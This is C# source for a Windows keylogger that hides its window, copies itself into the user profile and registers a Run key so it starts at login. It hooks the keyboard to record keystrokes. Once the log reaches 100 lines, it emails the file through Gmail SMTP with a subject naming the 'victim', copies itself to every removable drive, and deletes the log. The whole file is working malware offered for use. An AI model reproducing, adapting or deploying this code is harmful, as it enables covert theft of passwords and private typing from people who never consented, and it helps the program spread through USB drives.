using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Net.Mail;
using Microsoft.Win32;
using System.Windows.Input;



class InterceptKeys
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    
    public static void Main()
    {
        var handle = GetConsoleWindow();

        // Hide
         ShowWindow(handle, SW_HIDE);
        //copy app
        Doplicate();
        //run on startup
        SetStartup();
        //beginS
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
        
      
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            string appName = System.AppDomain.CurrentDomain.FriendlyName;
            int vkCode = Marshal.ReadInt32(lParam);
            string fileName = DateTime.Now.ToString("yyyy-MM-dd");
            // StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
            string pathToLog = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" +
            fileName + ".txt";// TODO - get more secret location.
            StreamWriter sw = new StreamWriter(pathToLog, true);
            if ((Keys)vkCode != Keys.Space && (Keys)vkCode != Keys.Enter)
            {
                sw.Write(((Keys)vkCode).ToString().ToLower());
                Console.Write(((Keys)vkCode).ToString().ToLower());
            }
            else
            {
                sw.WriteLine("");
                sw.WriteLine((Keys)vkCode);
                Console.WriteLine((Keys)vkCode);
            }
            sw.Close();
            
            if (File.ReadAllLines(pathToLog).Length > 100)
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
                mail.From = new MailAddress("your@email.com");
                mail.To.Add("your@email.com");
                mail.Subject = "log from keylogger on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                mail.Body = "New kelogging file from victim, finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");

                System.Net.Mail.Attachment attachment;
                attachment = new System.Net.Mail.Attachment(pathToLog);
                mail.Attachments.Add(attachment);
                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("your@email.com", "EMAIL PASSWORD");
                SmtpServer.EnableSsl = true;
                SmtpServer.Send(mail);
                //clear mail attachment
                attachment.Dispose();
                //copy program to an new destination
                //System.IO.File.Copy(path, Application.StartupPath + @"\log.txt", true);
                DriveInfo[] alldrives = DriveInfo.GetDrives();
                foreach (DriveInfo d in alldrives)
                {
                    if (d.DriveType == DriveType.Removable && d.IsReady)
                    {
                        System.IO.File.Copy(Application.StartupPath + @"\" + System.AppDomain.CurrentDomain.FriendlyName
                            , d.Name + @"\"+ System.AppDomain.CurrentDomain.FriendlyName, true);
                    }
                }
               
                //delete log file.
                File.Delete(pathToLog);

            }

        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }
    public static void SetStartup()
    {
        RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        string pathToSecCopy = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + AppDomain.CurrentDomain.FriendlyName;
        string pathToApp = Application.ExecutablePath;
        if (rkApp.GetValue(System.AppDomain.CurrentDomain.FriendlyName) == null)
        {
            rkApp.SetValue(System.AppDomain.CurrentDomain.FriendlyName, pathToSecCopy);
        }

    }
    public static void Doplicate()
    {
        if(Application.StartupPath != Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
        {
            System.IO.File.Copy(Application.StartupPath + @"\" + System.AppDomain.CurrentDomain.FriendlyName
                            , Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + AppDomain.CurrentDomain.FriendlyName, true);
        }
        
    }


    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;

}
